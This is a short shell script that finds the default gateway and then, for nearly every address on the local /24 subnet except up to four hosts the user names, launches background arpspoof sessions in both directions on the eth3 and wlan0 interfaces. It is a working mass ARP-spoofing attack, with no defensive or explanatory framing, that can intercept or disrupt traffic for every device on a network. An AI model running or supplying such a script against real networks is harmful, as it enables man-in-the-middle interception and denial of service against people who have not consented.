#!/bin/sh

#gateway=`netstat -r | grep ^default | awk '{print $2}'`;
#gateway=`$(perl mygateway.pl)`;
gateway=`netstat -rn | awk '/default/ {print $2}'`;

echo "Gateway:" $gateway
mask=`echo $gateway | cut -d"." -f1-3`
echo "Mask:" $mask

echo "Exclude 1?"
read user1
echo "Exclude 2?"
read user2
echo "Exclude 3?"
read user3
echo "Exclude 4?"
read user4

for x in $(seq 2 +1 253)

do
	if [ "$x" = "$user1" ] || [ "$x" = "$user2" ] || [ "$x" = "$user3" ] || [ "$x" = "$user4" ]; then
		echo $mask.$x "is whitelisted"
	else
		/usr/bin/screen -dmS $x-a arpspoof -i eth3 -t $mask.$x $gateway
		/usr/bin/screen -dmS $x-b arpspoof -i eth3 -t $gateway $mask.$x

		/usr/bin/screen -dmS $x-c arpspoof -i wlan0 -t $mask.$x $gateway
		/usr/bin/screen -dmS $x-d arpspoof -i wlan0 -t $gateway $mask.$x

		#ping -c 1 $mask.$x | grep ttl
	fi
done
